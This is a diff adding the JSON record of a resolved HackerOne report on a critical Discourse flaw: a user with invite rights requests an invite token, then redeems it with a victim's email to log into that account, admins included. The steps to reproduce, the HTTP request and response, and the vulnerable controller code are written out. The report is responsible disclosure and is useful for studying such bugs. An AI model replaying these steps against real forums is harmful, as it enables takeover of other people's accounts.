@@ -1,0 +1,118 @@
+{
+  "id": 242765,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDI3NjU=",
+  "url": "https://hackerone.com/reports/242765",
+  "title": "Any user with invite capabilities can take-over any account on Discourse",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2017-06-23T21:39:36.043Z",
+  "submitted_at": "2017-06-23T21:39:36.043Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mishre",
+    "url": "/mishre",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16893,
+    "url": "https://hackerone.com/discourse",
+    "handle": "discourse",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Discourse",
+      "twitter_handle": "discourse",
+      "website": "https://discourse.org",
+      "about": "Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-11-06T06:35:52.922Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-10-07T06:35:44.372Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Description\nUsers with a trust level of 2 and above on Discourse (being a member for 15 days,reading more than 100 posts and more - can be seen on: https://github.com/discourse/discourse/blob/b7386958edfb8215c99d90fde04521b3312d2ccd/config/site_settings.yml)  can invite new users to join discourse by sending an invite request. However, there exists an endpoint which uses the invite key without verifying the associated mail with the request and logs in a user to the victim's account if a valid invite key is provided.\n\n## Steps to reproduce\n1) Login with a user with trust level of 2 or above to discourse (tested on my local instal and against the code).\n2) Now find a valid CSRF-TOKEN by browsing the site and then send the following request:\n```\nPOST http://localhost:4000/invites/link HTTP/1.1\nHost: localhost:4000\nConnection: keep-alive\nContent-Length: 35\nOrigin: http://localhost:4000\nX-CSRF-Token: 8DkyJoFTPN4G4f3dBUWp2AsEtTg3mp7/pmoqQ9JLaZeCsKSX5DPce0O+57ni+Gc/O0cbU2rl7Y3Bdf9i2s+uZg==\nDiscourse-Visible: true\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nAccept: */*\nX-Requested-With: XMLHttpRequest\nReferer: http://localhost:4000/\nAccept-Encoding: gzip, deflate, sdch, br\nAccept-Language: he-IL,he;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2\nCookie: {redacted}\n\nemail=testingmichaelreiz@gmail.coma\n```\nyou\"ll receive the following response:\n```\nHTTP/1.1 200 OK\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1; mode=block\nX-Content-Type-Options: nosniff\nX-Discourse-Username: {some-user}\nX-Discourse-Route: invites/create_invite_link\nCache-Control: no-store, must-revalidate, private, max-age=0\nContent-Type: application/json; charset=utf-8\nSet-Cookie: _t=8f6f82a4709bad6dd66263a225f202c5; path=/; expires=Tue, 22 Aug 2017 21:14:37 -0000; HttpOnly; SameSite=Lax\nSet-Cookie: _forum_session=RUpSZFVQZmx2emVieVYwM0tscDBKV29jZ3FmU2xXSmIvTGlPTFpTVit0Z1lCU29wYmN6eDlkTDFnWXF1a1RUcVluNy9UYVhkd3hNK1h1OHZwNFBYL202WllEUkJzbWVRTytVR0VRenlxMUsrZUF6cktQSm1JU0g2Y3p1WVlNZ2dXSHNINlVDUzZzSFBQcXVVQXZDR1c5dFhkc1c0Tmk3bDRlK2ljRFRraTF6bmp2QzgxTlNnTXBhWnllVU1HelptLS16cUVkVmg5cC9JdC91RzhRenJqSGVnPT0%3D--c3b63a42a9a94781bc137c1030a71a1241c04a24; path=/; HttpOnly; SameSite=Lax\nSet-Cookie: __profilin=p%3Dt; path=/\nX-Request-Id: 4181e2be-5061-49dd-b3cc-1e033ece95bc\nX-Runtime: 1.912866\nX-MiniProfiler-Ids: [\"jfv6h7gfji19eekx7p57\",\"nsqp68md79y8tusrn8rn\",\"4s5fo1o25vp9l7954ybm\",\"blf2ua82vyc0n9683jwb\",\"fe5d5qfugyl5u0hjp7ez\",\"3s7hzl7imehtnono8p18\",\"dmmjnggyftilvg882j9q\",\"bwvs5enxy6pqockcxael\",\"tfu1fnjp7hi5e0nxhqwf\"]\nContent-Length: 64\n\n\"http://localhost:3000/invites/{some-token}\"\n```\nNow copy the token for a use in the later steps - don't click the link.\n3) Now open a new incognito tab and launch the following url:\n```\nhttp://localhost:4000/invites/redeem/{token-from-step3}?email=victimemail@gmail.com\n```\nYou should now be logged in to the victim's account.\n\n## Resolution\nYou should probably bind the invite token to a specific email in the InvitesController class. Also, the InvitesController seems to log in any user which launches a disposable invite link to the account with the email provided along the request as can be seen in the invites controller class:\n```\n    invite = Invite.find_by(invite_key: params[:token])\n\n    if invite.present?\n      user = Invite.redeem_from_token(params[:token], params[:email], params[:username], params[:name], params[:topic].to_i)\n      if user.present?\n        log_on_user(user)\n```\n\n## Impact\nAny user with invitation capabilities can therefore login as an admin account in case he knows either his username or his email.",
+  "bounty_amount": "1024.0",
+  "formatted_bounty": "$1,024",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-11-06T06:35:44.416Z",
+  "allow_singular_disclosure_after": -268390176.1451672,
+  "singular_disclosure_allowed": true,
+  "vote_count": 75,
+  "voters": [
+    "he4am",
+    "jokebookservice1",
+    "jensec",
+    "sp1d3rs",
+    "streaak",
+    "yumi",
+    "hunter",
+    "bl4de",
+    "spam404",
+    "surfrdan",
+    "and 65 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
